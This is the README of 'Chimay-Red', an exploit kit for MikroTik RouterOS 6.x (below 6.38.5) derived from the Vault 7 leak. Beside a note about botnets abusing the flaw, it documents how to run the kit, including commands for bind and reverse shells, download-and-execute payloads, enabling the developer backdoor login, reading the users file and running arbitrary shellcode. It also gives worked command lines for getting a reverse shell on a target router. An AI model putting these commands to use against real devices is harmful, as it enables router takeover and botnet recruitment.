# Chimay-Red
Mikrotik RouterOS (6.x < 6.38.5) exploit kit. Reverse engineered from the "Vault 7" WikiLeaks publication.

To learn more about the creation and purpose of this software, please visit: [http://blog.seekintoo.com/chimay-red.html](http://blog.seekintoo.com/chimay-red.html)

## Important Note: 

After further consideration by the **Seekintoo** team, it has been decided that additional architecture support will NOT be released exploiting any `RouterOS` supporting architecture either than `x86` and `mips`*.

The reasoning for this, after further research, is that there are currently botnet(s) operating on the internet taking advantage of this exact exploit attacking both x86 and mips* systems, both of which public exploits have been released for. The name of one of these botnets is "hajime". hajime's inception was long ago, but as of late it has been noticed to abuse the chimay-red exploit on `RouterOS 6.x` devices as covered and analyzed extensively (to name a few):

- [https://avlab.pl/en/exploit-chimay-red-vulnerable-device-mikrotik-and-ubiquiti-form-giant-botnet](https://avlab.pl/en/exploit-chimay-red-vulnerable-device-mikrotik-and-ubiquiti-form-giant-botnet)

- [https://www.bleepingcomputer.com/news/security/hajime-botnet-makes-a-comeback-with-massive-scan-for-mikrotik-routers/](https://www.bleepingcomputer.com/news/security/hajime-botnet-makes-a-comeback-with-massive-scan-for-mikrotik-routers/)

- [https://www.corero.com/blog/882-hajime-botnet-scanning-for-vulnerable-mikrotik-routers.html](https://www.corero.com/blog/882-hajime-botnet-scanning-for-vulnerable-mikrotik-routers.html)

- [https://forum.mikrotik.com/viewtopic.php?t=132490](https://forum.mikrotik.com/viewtopic.php?t=132490)

In-addition to the timing of the release of the first (known) public PoC for Chimay-Red by [BigNerd](https://github.com/BigNerd95/Chimay-Red) in contrast to the current state of rampant `RouterOS` harvesting botnets is currently too much to ignore. Therefore **Seekintoo** will **NOT** be responsible for contributing to these criminal enterprises.

Although if public exploits for additional architectures are found posted on source code hosting facilities, if robust enough, they WILL be re-supported here.

Feel free to contact me at: dpidhirney@seekintoo dot com

## Chimay-Red Usage:

```text
usage: chimay_red.py [-h] -t TARGET [-l LHOST] [--shellcommand SHELLCOMMAND]
                     [-d] [--breakpoints BREAKPOINTS] [-a ARCHITECTURE]
                     [--gdbport GDBPORT] [--binary BINARY]
                     [--shellcode SHELLCODE] [--vector VECTOR]
                     [--leakrounds LEAKROUNDS] [-v] [--version]
                     command

positional arguments:
  command               command function to run on target, see below for
                        options

optional arguments:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        target address:port
  -l LHOST, --lhost LHOST
                        specify the connectback* address
  --shellcommand SHELLCOMMAND
                        return interactive shell as main payload (default)
  -d, --debug           enable debugging mode
  --breakpoints BREAKPOINTS
                        list of comma delimited breakpoint addresses. Eg.
                        0x800400,0x800404
  -a ARCHITECTURE, --architecture ARCHITECTURE
                        target architecture (will detect automatically if
                        target in route table range)
  --gdbport GDBPORT     port to use when connecting to remote gdbserver
  --binary BINARY       target binary (www)
  --shellcode SHELLCODE
                        custom (optional) shellcode payload binary filepath
  --vector VECTOR       optional vector type, see below for options
  --leakrounds LEAKROUNDS
                        amount of rounds to leak pointers, higher is better,
                        but takes more time
  -v, --verbose         Verbosity mode
  --version             show program's version number and exit

Commands:
    COMMAND                    FUNCTION
    
    bindshell                    create a bindshell
    connectback                  create a reverse shell
    download_and_exe             connect back and download a file to then execute
    ssl_download_and_exe         connect back and download a file via SSL to then execute
    write_devel                  write "devel-login" file to allow developer account login
    write_devel_read_userfile    in addition to enabling developer logins, read back the users file
    
    custom_shellcode             run arbitrary shellcode from `--shellcode` binfile
    custom_shell_command         run a arbitrary $sh one liner on the target
    
Vectors:
    default: (mikrodb)

    [Generic]
        mikrodb:
            use the accompanying mikrodb database to load offsets 
            based off of detected remote version to build a ROP chain.
    
        build:
            build a ROP chain from scratch given the www binary matching
            the remote version running.
    
    [Experimental]
        leak:
            leak pointers from shared libraries to give better odds of
            finding base offset of uclibc.
            
Examples:

    Running simple shell command:
        ./chimay_red.py -v -t 192.168.56.124:80 \
            --vector=mikrodb     \
            --lhost=192.168.56.1 \
            --shellcommand="ls -la" custom_shell_command

    Getting a reverse shell:
        ./chimay_red.py -v -t 192.168.56.124:80 \
            --vector=mikrodb \
            --lhost=192.168.56.1 connectback
            
    Debugging the target:
        ./chimay_red.py -v -t 192.168.56.124:80 \
            --vector=build       \
            --architecture="x86" \
            --binary=$PWD/storage/www/www-x86-6.38.4.bin \
            --debug        \
            --gdbport=4444 \
            --lhost=192.168.56.1 connectback
    

==================================================
|  _______   _                     ___         __|
| / ___/ /  (_)_ _  ___ ___ ______/ _ \___ ___/ /|
|/ /__/ _ \/ /  ' \/ _ `/ // /___/ , _/ -_) _  / |
|\___/_//_/_/_/_/_/\_,_/\_, /   /_/|_|\__/\_,_/  |
|                      /___/                     |
==================================================
```

## mikrodb Usage:

```text
usage: mikrodb.py [-h] [-v] [--architectures ARCHITECTURES]
                  [--versions VERSIONS]

optional arguments:
  -h, --help            show this help message and exit
  -v, --verbose         Verbosity mode
  --architectures ARCHITECTURES
                        architectures to build for. Eg. --architectures="x86"
                        or "x86,mmips"
  --versions VERSIONS   versions to build for. Eg. --versions="6.38.4" or
                        "6.36.4,6.38.4"

Example: 
    ./mikrodb.py --architectures="x86" --versions="6.36.4,6.38.4"

```
